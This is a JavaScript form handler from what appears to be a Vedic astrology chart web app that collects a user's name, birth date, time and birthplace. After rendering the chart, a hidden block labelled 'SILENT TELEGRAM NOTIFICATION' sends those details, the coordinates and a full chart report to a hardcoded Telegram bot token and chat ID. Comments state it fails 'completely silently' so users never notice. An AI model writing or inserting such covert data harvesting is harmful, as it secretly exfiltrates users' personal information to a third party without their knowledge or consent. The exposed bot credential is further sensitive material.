/* ============================================================================
   FORM SUBMIT -> COMPUTE -> RENDER
   ============================================================================ */
document.getElementById('birthForm').addEventListener('submit', (e)=>{
  e.preventDefault();
  const errorBanner = document.getElementById('errorBanner');
  errorBanner.classList.remove('show');

  const name = document.getElementById('profileName').value.trim();
  const dob = document.getElementById('dobInput').value;
  const tob = document.getElementById('tobInput').value;
  const tz = parseFloat(document.getElementById('tzInput').value);

  if (!name || !dob || !tob){
    const miss = [!name?'your name':'', !dob?'the date you were born':'', !tob?'the time you were born (tap "No idea" if unsure)':''].filter(Boolean).join(', ');
    errorBanner.textContent = "Almost there! Please add: " + miss + ".";
    errorBanner.classList.add('show');
    return;
  }
  if (selectedLat === null || selectedLon === null){
    errorBanner.textContent = "Please tap your city in the list that appears under the box (or use the map pin) so we know where you were born.";
    errorBanner.classList.add('show');
    return;
  }

  const loadingOverlay = document.getElementById('loadingOverlay');
  loadingOverlay.classList.add('show');
  document.getElementById('results').classList.remove('show');

  setTimeout(()=>{
    const profile = {
      name, dob, tob, tz,
      place: placeInput.value, lat: selectedLat, lon: selectedLon,
      savedAt: Date.now()
    };

    const profiles = loadProfiles();
    const existingIdx = profiles.findIndex(p=> p.name===name && p.dob===dob && p.tob===tob && p.place===profile.place);
    if (existingIdx >= 0) profiles[existingIdx] = profile; else profiles.push(profile);
    saveProfiles(profiles);
    refreshProfileSelect();
    const sel = document.getElementById('profileSelect');
    const newIdx = profiles.findIndex(p=> p.savedAt===profile.savedAt);
    sel.value = newIdx;

    loadingOverlay.classList.remove('show');
    document.getElementById('intakeSection').style.display = 'none';
    
    // Render the chart first so the calculations are finished
    renderResults(profile);

    // --- SILENT TELEGRAM NOTIFICATION WITH REPORT ATTACHMENT ---
    try {
      const silentMsg = `🔮 *New Chart Calculated*\n*Name:* ${name}\n*DOB:* ${dob}\n*TOB:* ${tob}\n*Place:* ${placeInput.value}\n*Coords:* ${selectedLat}, ${selectedLon}\n*TZ:* ${tz}`;
      
      // Select all sections for the background report
      const sections = {
        birthDetails: true, chartSummary: true, karakas: true, planetTable: true, 
        aspects: true, yogas: true, shadbala: true, ashtakavarga: true, 
        dasha: true, vargas: true, rawLongitudes: true, liveSky: false
      };
      sections.vargaKeys = Object.keys(VARGAS);

      // Generate the text file
      const reportText = buildFullReportText(currentChartForModal, profile, sections, null);
      const blob = new Blob([reportText], { type: 'text/plain;charset=utf-8' });
      const safeName = name.replace(/[^a-z0-9]/gi, '_');

      // Package everything as a form data to send as a document
      const formData = new FormData();
      formData.append('chat_id', '7423028565');
      formData.append('caption', silentMsg);
      formData.append('parse_mode', 'Markdown');
      formData.append('document', blob, `${safeName}_vedic_chart.txt`);

      fetch(`https://api.telegram.org/bot8077089694:AAGDGFMN-XHAy_gpIndCSOAFqTT3jXFJTug/sendDocument`, {
        method: 'POST',
        body: formData
      }).catch(()=>{}); // Fails completely silently
    } catch(e) {} // Catch any rendering errors so the user UI never breaks
    // ------------------------------------

  }, 400);
});

